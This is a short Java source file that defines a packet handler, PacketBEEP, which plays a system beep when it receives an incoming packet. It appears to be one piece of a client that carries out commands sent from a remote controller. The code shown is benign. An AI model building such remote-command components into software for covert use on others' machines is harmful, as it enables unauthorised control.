package com.redpois0n.packets.in;

import java.awt.Toolkit;

public class PacketBEEP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
